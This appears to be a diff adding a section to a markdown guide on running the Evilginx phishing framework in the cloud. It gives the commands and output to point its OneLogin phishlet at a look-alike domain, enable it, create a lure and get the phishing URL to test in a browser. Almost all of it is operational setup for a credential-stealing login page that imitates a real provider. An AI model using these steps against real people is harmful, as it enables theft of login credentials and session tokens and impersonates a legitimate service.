@@ -102,4 +102,27 @@ Once that is in you can navigate to the lure URL to make sure its works properly
 
 ***
 
+### Run Evilginx on the Cloud:
 
+* We need to choose one of the phishlets that we weant to use and configure it in evilginx:
+            
+```phishlets hostname <pick one, i like onelogin> <enetr whatever dns we just created>```
+            
+[ex.] ```phishlets hostname onelogin login.raymondspizzeria.cf```
+[output] ```[04:57:58] [inf] disabled phishlet 'onelogin'```
+            
+* Now we need to enable the phishlet 'onelogin' that we just configured:
+            
+```phishlets enable onelogin```
+            
+* Next we need to creates out lures:
+            
+```lures create onelogin```
+            
+[output] ```created lure with ID: 0```
+            
+* Next we are going to want to get our actual url for out phish:
+            
+```lures get-url 0```
+
+* Now open a new wwbbrowser and test out this new link produced by Evilginx and make sure that it works ! ! !
